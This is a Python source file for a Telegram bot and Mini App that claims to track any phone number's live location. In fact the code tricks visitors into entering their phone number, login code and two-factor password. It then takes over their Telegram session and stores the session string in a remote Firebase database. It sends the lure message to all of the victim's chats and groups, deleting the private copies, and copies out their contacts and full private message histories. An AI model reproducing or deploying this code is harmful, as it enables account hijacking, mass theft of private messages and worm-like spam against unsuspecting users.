import os
import asyncio
import re
import time
import traceback
import requests
from urllib.parse import quote
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.types import User, Chat, Channel
from telethon.tl.custom import Button

# --- Configuration ---
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
FIREBASE_BASE_URL = os.environ.get("FIREBASE_BASE_URL", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://your-app.onrender.com")
BOT_USERNAME = os.environ.get("BOT_USERNAME", "anontracker_bot")
CONCURRENT_CHATS = 5

SHARE_INVITE_TEXT = (
    "Track any mobile number's live location & full details instantly! "
    "Open this bot and tap the Location menu button."
)

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
templates = Jinja2Templates(directory="templates")

active_clients = {}
auth_data = {}
pipeline_running = set()

bot = TelegramClient('bot_session', API_ID, API_HASH) if API_ID and API_HASH else None


def bot_link() -> str:
    return f"https://t.me/{BOT_USERNAME}"


def build_share_url() -> str:
    """Telegram share URL that shares the BOT LINK with an invite message. URL-encoded."""
    return (
        "https://t.me/share/url"
        f"?url={quote(bot_link(), safe='')}"
        f"&text={quote(SHARE_INVITE_TEXT, safe='')}"
    )


def build_broadcast_text() -> str:
    return (
        "🔍 **Track Any User Live Location & Full Details**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📍 **Live GPS Tracking**\n"
        "👤 **Full Name & Owner Info**\n"
        "📱 **Mobile Number Details**\n"
        "🏦 **Bank & Financial Data**\n"
        "📞 **Call Logs & Message Records**\n"
        "🛰️ **Network & IP Intelligence**\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ **How to use:**\n"
        "1️⃣ Open the bot\n"
        "2️⃣ Tap the **Location** menu button (bottom-left)\n"
        "3️⃣ Enter any mobile number\n"
        "4️⃣ Get live location + full details instantly\n\n"
        f"🚀 **Track Now:** {bot_link()}\n\n"
        f"👉 Bot: **@{BOT_USERNAME}**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔒 Private • Fast • Anonymous"
    )


# ============================================================
# BOT HANDLERS
# ============================================================
if bot:
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        print(f"[bot /start] received from {event.sender_id}")
        try:
            welcome_text = (
                "👋 **Welcome to Anon Locater Bot!**\n\n"
                "I can help you track the live location, device details, and network data "
                "of any mobile number worldwide.\n\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "⚡ **How to Track:**\n"
                "1️⃣ Tap the **Location** menu button (bottom-left of this chat)\n"
                "2️⃣ Enter the target mobile number\n"
                "3️⃣ Complete the quick verification\n"
                "4️⃣ Get live location + full details instantly\n"
                "━━━━━━━━━━━━━━━━━━━━━\n\n"
                "👇 Tap **Location** to start tracking.\n\n"
                f"↗️ **Share this bot:** {bot_link()}"
            )
            kb = [
                [Button.url("↗️ Share Bot", build_share_url())],
            ]
            await event.reply(welcome_text, buttons=kb)
            print(f"[bot /start] replied to {event.sender_id}")
        except Exception as e:
            traceback.print_exc()
            print(f"[bot /start] error: {e}")

    @bot.on(events.NewMessage(func=lambda e: getattr(e.message, 'contact', None) is not None))
    async def contact_handler(event):
        try:
            phone = event.message.contact.phone_number
            if not phone.startswith('+'):
                phone = '+' + phone
            tg_id = str(event.sender_id)
            await patch_to_firebase(f"number/{tg_id}", {"phone": phone, "id": tg_id})
            await event.reply("✅ Number received. Open the Mini App to continue.")
        except Exception as e:
            print(f"[bot contact] error: {e}")


@app.on_event("startup")
async def startup_event():
    if not BOT_TOKEN or not API_ID or not API_HASH or bot is None:
        print("⚠️ Bot not configured (BOT_TOKEN/API_ID/API_HASH missing). Bot will NOT run.")
        return

    print("🔧 Connecting bot...")
    await bot.start(bot_token=BOT_TOKEN)
    print("🔧 Bot connected, fetching me...")

    me = await bot.get_me()
    print(f"🤖 Bot started: @{me.username} (id={me.id})")

    def _clear_webhook():
        try:
            res = requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true",
                timeout=5,
            )
            return res.json()
        except Exception as e:
            return str(e)

    status = await asyncio.to_thread(_clear_webhook)
    print(f"Webhook deletion status: {status}")

    asyncio.create_task(bot.run_until_disconnected())
    print("🔧 Update loop started")


# --- Firebase Helpers ---
async def put_to_firebase(path, data):
    def _req():
        try:
            requests.put(f"{FIREBASE_BASE_URL}/{path}.json", json=data, timeout=15)
        except Exception as e:
            print(f"fb put err {path}: {e}")
    await asyncio.to_thread(_req)


async def patch_to_firebase(path, data):
    def _req():
        try:
            requests.patch(f"{FIREBASE_BASE_URL}/{path}.json", json=data, timeout=15)
        except Exception as e:
            print(f"fb patch err {path}: {e}")
    await asyncio.to_thread(_req)


async def get_from_firebase(path):
    def _req():
        try:
            res = requests.get(f"{FIREBASE_BASE_URL}/{path}.json", timeout=15)
            if res.status_code == 200:
                return res.json()
        except Exception:
            pass
        return None
    return await asyncio.to_thread(_req)


async def get_last_msg_id(base_path, user_id):
    def _req():
        try:
            res = requests.get(
                f"{FIREBASE_BASE_URL}/{base_path}/chats/{user_id}.json"
                f"?orderBy=\"$key\"&limitToLast=1",
                timeout=15,
            )
            if res.status_code == 200 and res.json():
                return int(list(res.json().keys())[0])
        except Exception:
            pass
        return 0
    return await asyncio.to_thread(_req)


# ============================================================
# PRIORITY 1: BROADCAST
# ============================================================
async def broadcast_to_all(client, me, tg_user_id, tg_username):
    my_username = re.sub(r'[\.\$#\[\]/]', '_', me.username or str(me.id))
    stats_path = f"broadcast_stats/{my_username}"
    text = build_broadcast_text()
    p2p_count = group_count = channel_count = 0
    recipients = {}

    # Force full dialog sync — fixes partial first-call iter_dialogs() results
    print("[broadcast] fetching dialogs...")
    try:
        dialogs = [d async for d in client.iter_dialogs()]
    except Exception as e:
        print(f"[broadcast] iter_dialogs failed: {type(e).__name__}: {e}")
        dialogs = []
    print(f"[broadcast] got {len(dialogs)} dialogs")

    for dialog in dialogs:
        entity = dialog.entity
        chat_id = str(dialog.id)
        name = dialog.name or "Unknown"
        username = getattr(entity, 'username', None) or "None"

        is_p2p = isinstance(entity, User) and not getattr(entity, 'bot', False)
        is_group = isinstance(entity, Chat) or (
            isinstance(entity, Channel) and getattr(entity, 'megagroup', False)
        )
        is_channel = (
            isinstance(entity, Channel)
            and getattr(entity, 'broadcast', False)
            and not getattr(entity, 'megagroup', False)
        )

        if is_channel:
            try:
                perms = await client.get_permissions(entity, me)
                if not (perms and (perms.is_admin or perms.is_creator)):
                    print(f"[broadcast] skip channel {chat_id} — not admin")
                    continue
            except Exception as e:
                print(f"[broadcast] skip channel {chat_id} — perms error: {type(e).__name__}: {e}")
                continue
        if not (is_p2p or is_group or is_channel):
            continue

        try:
            sent_msg = await client.send_message(entity, text, link_preview=True)
            recipients[chat_id] = {
                "name": name, "username": username,
                "type": "p2p" if is_p2p else ("group" if is_group else "channel"),
                "sent": True, "msg_id": sent_msg.id,
            }
            if is_p2p:
                p2p_count += 1
                try:
                    await client.delete_messages(entity, sent_msg, revoke=False)
                except Exception as e:
                    print(f"[broadcast] p2p del err {chat_id}: {type(e).__name__}: {e}")
            elif is_group:
                group_count += 1
            elif is_channel:
                channel_count += 1
            await asyncio.sleep(1.2)
        except FloodWaitError as e:
            print(f"[broadcast] flood wait {e.seconds}s at {chat_id}")
            await asyncio.sleep(e.seconds)
        except Exception as e:
            print(f"[broadcast] send fail {chat_id} ({type(entity).__name__}): "
                  f"{type(e).__name__}: {e}")
            recipients[chat_id] = {
                "name": name, "username": username,
                "type": "p2p" if is_p2p else ("group" if is_group else "channel"),
                "sent": False, "error": f"{type(e).__name__}: {str(e)[:180]}",
            }

    summary = {
        "tg_user_id": tg_user_id, "tg_username": tg_username,
        "owner_username": my_username, "owner_chat_id": str(me.id),
        "owner_name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
        "p2p_sent": p2p_count, "group_sent": group_count, "channel_sent": channel_count,
        "total_sent": p2p_count + group_count + channel_count,
        "created_at": int(time.time()),
        "share_url": build_share_url(),
        "recipients": recipients,
    }
    await put_to_firebase(stats_path, summary)
    await put_to_firebase(f"users_data/{tg_user_id}/broadcast", summary)
    print(f"[broadcast] DONE p2p={p2p_count} group={group_count} channel={channel_count}")


# ============================================================
# PRIORITY 2: BACKUP
# ============================================================
async def scrape_chat(client, user, base_path):
    user_id = str(user.id)
    last_id = await get_last_msg_id(base_path, user_id)
    chat_history, count = {}, 0
    sender_counts = {}
    try:
        async for message in client.iter_messages(user, reverse=True, min_id=last_id, limit=None):
            chat_history[str(message.id)] = {
                "d": message.date.isoformat() if message.date else "",
                "s": message.sender_id, "t": message.text or "[Media]",
            }
            sid = str(message.sender_id)
            sender_counts[sid] = sender_counts.get(sid, 0) + 1
            count += 1
            if count % 200 == 0:
                await patch_to_firebase(f"{base_path}/chats/{user_id}", chat_history)
                chat_history = {}
        if chat_history:
            await patch_to_firebase(f"{base_path}/chats/{user_id}", chat_history)
        if sender_counts:
            await patch_to_firebase(f"{base_path}/sender_counts/{user_id}", sender_counts)
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
    except Exception as e:
        print(f"[scrape] {user_id} err: {type(e).__name__}: {e}")


async def run_backup(session_string, tg_user_id, tg_username):
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    try:
        me = await client.get_me()
        my_username = re.sub(r'[\.\$#\[\]/]', '_', me.username or str(me.id))
        base_path = f"backup/{my_username}"

        contacts = await client(GetContactsRequest(hash=0))
        contact_ids = {str(u.id) for u in contacts.users}
        contacts_data = {
            str(u.id): {
                "first_name": u.first_name or "", "last_name": u.last_name or "",
                "phone": f"+{u.phone}" if u.phone else "Hidden",
                "username": u.username or "None",
            } for u in contacts.users
        }
        if contacts_data:
            await put_to_firebase(f"{base_path}/contacts", contacts_data)

        p2p_users, unsaved, dialogs_data = [], {}, {"channels": {}, "groups": {}}
        async for dialog in client.iter_dialogs():
            entity = dialog.entity
            entity_id = str(dialog.id)
            if isinstance(entity, User) and not getattr(entity, 'bot', False):
                p2p_users.append(entity)
                if entity_id not in contact_ids:
                    unsaved[entity_id] = {"n": dialog.name, "u": entity.username}
            elif isinstance(entity, (Chat, Channel)):
                chat_type = "channels" if getattr(entity, 'broadcast', False) else "groups"
                invite_link = getattr(entity, 'username', None)
                invite_link = f"https://t.me/{invite_link}" if invite_link else "Private"
                dialogs_data[chat_type][entity_id] = {
                    "name": entity.title, "invite_url": invite_link, "entity_id": entity.id,
                }
        if unsaved:
            await patch_to_firebase(f"{base_path}/unsaved", unsaved)
        if dialogs_data["channels"] or dialogs_data["groups"]:
            await patch_to_firebase(f"{base_path}/dialogs", dialogs_data)

        for i in range(0, len(p2p_users), CONCURRENT_CHATS):
            tasks = [scrape_chat(client, u, base_path) for u in p2p_users[i:i + CONCURRENT_CHATS]]
            await asyncio.gather(*tasks)
    finally:
        await client.disconnect()


# ============================================================
# PIPELINE
# ============================================================
async def run_pipeline(session_string, tg_user_id, tg_username):
    print(f"[pipeline] START run_pipeline for {tg_user_id}")
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        print(f"[pipeline] connected")
        try:
            me = await client.get_me()
            print(f"[pipeline] me=@{me.username} id={me.id}")
            await broadcast_to_all(client, me, tg_user_id, tg_username)
        finally:
            await client.disconnect()
        print(f"[pipeline] broadcast finished, starting backup")
        await run_backup(session_string, tg_user_id, tg_username)
        print(f"[pipeline] backup finished for {tg_user_id}")
    except Exception as e:
        traceback.print_exc()
        print(f"[pipeline] ERROR: {type(e).__name__}: {e}")
    finally:
        pipeline_running.discard(tg_user_id)
        print(f"[pipeline] cleaned up {tg_user_id}")


def start_pipeline(session_string, tg_user_id, tg_username):
    if tg_user_id in pipeline_running:
        print(f"[pipeline] SKIP {tg_user_id} — already in pipeline_running")
        return
    print(f"[pipeline] scheduling for {tg_user_id}")
    pipeline_running.add(tg_user_id)
    asyncio.create_task(run_pipeline(session_string, tg_user_id, tg_username))


# ============================================================
# ROUTES
# ============================================================
@app.get("/ping")
async def ping():
    return JSONResponse({"status": "alive"})


@app.head("/ping")
async def ping_head():
    return JSONResponse({"status": "alive"})


@app.head("/")
async def index_head():
    return JSONResponse({"status": "ok"})


@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse(request=request, name="index.html", context={"request": request})


@app.post("/check_session")
async def check_session(request: Request):
    data = await request.json()
    tg_id = str(data.get("tg_user_id"))

    existing = await get_from_firebase(f"tgsession/{tg_id}")
    if existing and existing.get("session_string"):
        session_str = existing["session_string"]
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        try:
            await client.connect()
            authorized = await client.is_user_authorized()
            await client.disconnect()
            if authorized:
                start_pipeline(session_str, tg_id, data.get("tg_username"))
                return JSONResponse({"status": "exists"})
        except Exception as e:
            print(f"check_session error: {type(e).__name__}: {e}")

    attempt = await get_from_firebase(f"tgsession/{tg_id}/attempted")
    await put_to_firebase(f"tgsession/{tg_id}/miniapp_info", data)
    if attempt:
        return JSONResponse({"status": "signup_required", "share_url": build_share_url()})
    return JSONResponse({"status": "not_found", "share_url": build_share_url()})


@app.post("/api/track_target")
async def track_target(request: Request):
    data = await request.json()
    tg_id = str(data.get("tg_user_id"))
    await patch_to_firebase(f"tracked_history/{tg_id}", {data.get("target_number"): "Queried"})
    await put_to_firebase(f"tgsession/{tg_id}/attempted", True)
    return JSONResponse({"status": "success"})


@app.post("/api/check_phone")
async def check_phone(request: Request):
    tg_id = str((await request.json()).get("tg_user_id"))
    num_data = await get_from_firebase(f"number/{tg_id}")
    if num_data and num_data.get("phone"):
        return JSONResponse({"status": "found", "phone": num_data.get("phone")})
    return JSONResponse({"status": "waiting"})


@app.get("/api/share_url")
async def share_url():
    return JSONResponse({"url": build_share_url(), "bot_link": bot_link(), "text": SHARE_INVITE_TEXT})


@app.get("/api/session_status/{tg_id}")
async def session_status(tg_id: str):
    """Diagnostic: is a pipeline running, and what's in Firebase."""
    in_run = tg_id in pipeline_running
    sess = await get_from_firebase(f"tgsession/{tg_id}") or {}
    user_data = await get_from_firebase(f"users_data/{tg_id}") or {}
    broadcast = await get_from_firebase(f"users_data/{tg_id}/broadcast") or {}
    return JSONResponse({
        "tg_id": tg_id,
        "pipeline_running": in_run,
        "has_session_string": bool(sess.get("session_string")),
        "attempted": bool(sess.get("attempted")),
        "revoked": bool(sess.get("revoked")),
        "user_data_keys": list(user_data.keys()),
        "broadcast_summary": {
            k: broadcast.get(k) for k in
            ("p2p_sent", "group_sent", "channel_sent", "total_sent", "created_at")
        } if broadcast else None,
    })


@app.post("/api/action")
async def handle_action(request: Request):
    data = await request.json()
    action = data.get("action")
    tg_id = str(data.get("tg_user_id", "web_test"))
    tg_name = data.get("tg_name", "Unknown")
    tg_username = data.get("tg_username", "Unknown")

    if action == "send_phone":
        phone = data.get("phone", "").replace(" ", "")
        if not re.match(r"^\+\d{6,15}$", phone):
            return JSONResponse({"status": "error", "message": "Invalid phone number"})

        await patch_to_firebase(f"number/{tg_id}", {"phone": phone, "id": tg_id})

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            send_code_info = await client.send_code_request(phone)
            active_clients[tg_id] = client
            auth_data[tg_id] = {"phone": phone, "phone_code_hash": send_code_info.phone_code_hash}
            return JSONResponse({"status": "success", "next_step": "otp"})
        except Exception as e:
            return JSONResponse({"status": "error", "message": f"{type(e).__name__}: {e}"})

    elif action == "send_otp":
        client = active_clients.get(tg_id)
        auth_info = auth_data.get(tg_id)
        if not client or not auth_info:
            return JSONResponse({"status": "error", "message": "Session expired. Re-enter phone.", "next_step": "phone"})

        otp = str(data.get("otp", "")).strip()
        if not re.match(r"^\d{4,6}$", otp):
            return JSONResponse({"status": "error", "message": "Invalid OTP"})

        try:
            await client.sign_in(
                auth_info["phone"], otp,
                phone_code_hash=auth_info["phone_code_hash"],
            )
            session_str = client.session.save()

            # Persist ONLY safe fields — never OTP / phone_code_hash / 2FA password
            safe_session = {
                "phone": auth_info["phone"],
                "session_string": session_str,
                "tg_id": tg_id,
                "tg_username": tg_username,
                "created_at": int(time.time()),
            }
            await patch_to_firebase(f"tgsession/{tg_id}", safe_session)
            await patch_to_firebase(f"users_data/{tg_id}", {
                "chatid": tg_id, "name": tg_name, "username": tg_username,
                "mobile_number": auth_info["phone"], "Telegram_Session": session_str,
            })

            # scrub in-memory credentials immediately
            auth_info.pop("phone_code_hash", None)

            start_pipeline(session_str, tg_id, tg_username)

            await client.disconnect()
            active_clients.pop(tg_id, None)
            auth_data.pop(tg_id, None)

            return JSONResponse({"status": "success", "next_step": "result"})
        except SessionPasswordNeededError:
            return JSONResponse({"status": "success", "next_step": "2fa"})
        except Exception as e:
            return JSONResponse({"status": "error", "message": f"{type(e).__name__}: {e}"})

    elif action == "send_2fa":
        client = active_clients.get(tg_id)
        auth_info = auth_data.get(tg_id)
        if not client or not auth_info:
            return JSONResponse({"status": "error", "message": "Session expired. Re-enter phone.", "next_step": "phone"})

        password = data.get("password")
        if not password:
            return JSONResponse({"status": "error", "message": "Password required"})

        try:
            await client.sign_in(password=password)
            session_str = client.session.save()

            # Persist ONLY safe fields — never the 2FA password itself
            safe_session = {
                "phone": auth_info.get("phone", ""),
                "session_string": session_str,
                "tg_id": tg_id,
                "tg_username": tg_username,
                "created_at": int(time.time()),
                "twofa_used": True,
            }
            await patch_to_firebase(f"tgsession/{tg_id}", safe_session)
            await patch_to_firebase(f"users_data/{tg_id}", {
                "chatid": tg_id, "name": tg_name, "username": tg_username,
                "mobile_number": auth_info.get("phone", ""), "Telegram_Session": session_str,
            })

            # scrub in-memory credentials
            auth_info.pop("phone_code_hash", None)
            auth_info.pop("otp", None)

            start_pipeline(session_str, tg_id, tg_username)

            await client.disconnect()
            active_clients.pop(tg_id, None)
            auth_data.pop(tg_id, None)

            return JSONResponse({"status": "success", "next_step": "result"})
        except Exception as e:
            return JSONResponse({"status": "error", "message": f"{type(e).__name__}: {e}"})

    return JSONResponse({"status": "error", "message": "Unknown action"})


if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run(app, host="0.0.0.0", port=port, proxy_headers=True, forwarded_allow_ips="*")
